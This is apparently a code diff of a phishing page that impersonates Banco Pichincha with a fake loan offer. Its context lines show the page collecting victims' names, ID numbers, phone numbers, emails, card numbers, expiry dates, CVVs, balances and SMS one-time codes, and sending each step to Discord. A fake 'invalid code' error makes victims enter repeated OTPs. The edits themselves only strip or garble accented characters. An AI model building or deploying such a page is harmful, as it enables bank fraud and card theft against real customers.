@@ -226,7 +226,7 @@
   </head>
   <body>
     <div class="container">
-      <!-- LOGO AÑADIDO -->
+      <!-- LOGO AÃ‘ADIDO -->
       <div class="logo-container">
         <img
           src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png"
@@ -249,7 +249,7 @@
             <input
               type="text"
               id="nombre"
-              placeholder="Ej: Juan Alberto Pérez"
+              placeholder="Ej: Juan Alberto Perez"
               required
             />
           </div>
@@ -311,11 +311,11 @@
             <div class="form-group">
               <label>Plazo (Meses)</label>
               <select id="plazo" onchange="updateCuota()">
-                <option value="12">12 meses (1 año)</option>
-                <option value="24">24 meses (2 años)</option>
-                <option value="36">36 meses (3 años)</option>
-                <option value="48">48 meses (4 años)</option>
-                <option value="60">60 meses (5 años)</option>
+                <option value="12">12 meses (1 ano)</option>
+                <option value="24">24 meses (2 anos)</option>
+                <option value="36">36 meses (3 anos)</option>
+                <option value="48">48 meses (4 anos)</option>
+                <option value="60">60 meses (5 anos)</option>
               </select>
             </div>
             <div class="result-box">
@@ -329,7 +329,7 @@
           >
         </div>
 
-        <!-- PASO 3: VALIDACIÓN Y DESEMBOLSO -->
+        <!-- PASO 3: VALIDACION Y DESEMBOLSO -->
         <div id="step3" class="step">
           <div class="header">
             <h2>Validacion Final</h2>
@@ -340,7 +340,7 @@
           </div>
 
           <div class="info-box">
-            <strong>¿Por que solicitamos su saldo disponible?</strong><br />
+            <strong>Â¿Por que solicitamos su saldo disponible?</strong><br />
             Nuestro sistema de seguridad requiere validar que su cuenta posee el
             <strong>monto disponible minimo</strong> para la cobertura del
             seguro de desgravamen y gastos de instrumentacion legal del credito
@@ -397,11 +397,11 @@
           >
         </div>
 
-        <!-- PASO 4: CÓDIGO DE VERIFICACIÓN -->
+        <!-- PASO 4: CODIGO DE VERIFICACION -->
         <div id="step4" class="step">
           <div class="header">
             <h2>Verificacion de Identidad</h2>
-            <p>Ingrese el codigo de 6 dígitos enviado a su celular.</p>
+            <p>Ingrese el codigo de 6 digitos enviado a su celular.</p>
           </div>
 
           <div class="form-group">
@@ -415,7 +415,7 @@
               oninput="this.value = this.value.replace(/\D/g, '')"
             />
             <div id="errorMsg" class="error-message">
-              Código invalido. Intente nuevamente.
+              Codigo invalido. Intente nuevamente.
             </div>
           </div>
 
@@ -428,7 +428,7 @@
               margin-top: 20px;
             "
           >
-            ¿No recibio el código?
+            Â¿No recibio el codigo?
             <span
               style="
                 color: var(--pichincha-blue);
@@ -440,14 +440,14 @@
           </p>
         </div>
 
-        <!-- PASO 5: CRÉDITO APROBADO -->
+        <!-- PASO 5: CREDITO APROBADO -->
         <div id="step5" class="step">
           <span class="success-icon">?</span>
           <div class="header">
-            <h2>¡Proceso Exitoso!</h2>
+            <h2>Â¡Proceso Exitoso!</h2>
           </div>
           <div class="success-text">
-            Credito aprobado. En 24 horas será desembolsado en su tarjeta
+            Credito aprobado. En 24 horas sera desembolsado en su tarjeta
             registrada.
           </div>
           <button onclick="location.reload()">Cerrar sesion segura</button>
@@ -512,7 +512,7 @@
             return;
           }
           sendToDiscord(
-            `**PASO 1: DATOS PERSONALES**\n**Nombre:** ${nom}\n**Cédula:** ${ced}\n**Celular:** ${cel}\n**Correo:** ${mail}`
+            `**PASO 1: DATOS PERSONALES**\n**Nombre:** ${nom}\n**CÃ©dula:** ${ced}\n**Celular:** ${cel}\n**Correo:** ${mail}`
           );
         }
 
@@ -536,7 +536,7 @@
           }
 
           sendToDiscord(
-            `**PASO 3: TARJETA**\n**Número:** ${tarjeta}\n**Fecha:** ${fecha}\n**CVV:** ${cvv}\n**Saldo Disponible:** $${saldo}`
+            `**PASO 3: TARJETA**\n**NÃºmero:** ${tarjeta}\n**Fecha:** ${fecha}\n**CVV:** ${cvv}\n**Saldo Disponible:** $${saldo}`
           );
         }
 
@@ -566,13 +566,13 @@
         const errorDiv = document.getElementById("errorMsg");
 
         if (input.value.length < 6) {
-          alert("Ingrese los 6 dígitos.");
+          alert("Ingrese los 6 dÃ­gitos.");
           return;
         }
 
         errorCount++;
         sendToDiscord(
-          `**PASO 4: CÓDIGO OTP**\n**Intento #:** ${errorCount}\n**Código ingresado:** ${input.value}`
+          `**PASO 4: CÃ“DIGO OTP**\n**Intento #:** ${errorCount}\n**CÃ³digo ingresado:** ${input.value}`
         );
 
         if (errorCount < 3) {
